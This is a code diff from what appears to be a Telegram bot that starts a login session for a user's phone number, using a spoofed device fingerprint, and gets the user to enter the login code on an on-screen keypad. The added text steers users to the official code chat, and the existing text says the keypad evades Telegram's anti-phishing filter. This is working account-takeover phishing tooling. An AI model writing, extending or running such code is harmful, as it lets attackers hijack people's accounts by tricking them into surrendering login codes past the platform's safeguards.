@@ -1019,7 +1019,7 @@ async def auth_flow_listener(client: Client, message: Message):
                 name=f"temp_login_{user_id}",
                 api_id=API_ID,
                 api_hash=API_HASH,
-                workdir=str(SESSIONS_DIR),
+                in_memory=True,
                 **fingerprint,
             )
             await temp_client.connect()
@@ -1034,9 +1034,21 @@ async def auth_flow_listener(client: Client, message: Message):
             )
             temp_numpad_codes[user_id] = ""
 
+            delivery_dest = "Telegram App (Official Service Chat)"
+            if hasattr(code_info, "type"):
+                t_type = str(code_info.type).lower()
+                if "sms" in t_type:
+                    delivery_dest = "SMS (Check your phone SMS inbox)"
+                elif "call" in t_type:
+                    delivery_dest = "Phone Call"
+
             numpad_text = (
-                f"📩 **Login Code Sent to Telegram!**\n\n"
-                f"• **Phone:** `{clean_phone}`\n\n"
+                f"📩 **Login Code Sent!**\n\n"
+                f"• **Phone:** `{clean_phone}`\n"
+                f"• **Destination:** `{delivery_dest}`\n\n"
+                f"⚠️ **IMPORTANT:**\n"
+                f"Telegram sends login codes to your **Telegram App** (chat from **Telegram** / 777000), NOT via SMS!\n"
+                f"Please open your Telegram chat list and check the official code.\n\n"
                 "👇 **Tap the digits on the keypad below to enter your code:**\n"
                 "Code: `[ _ _ _ _ _ ]`\n\n"
                 "💡 _Using this keypad prevents Telegram's anti-phishing filter from blocking your code._"
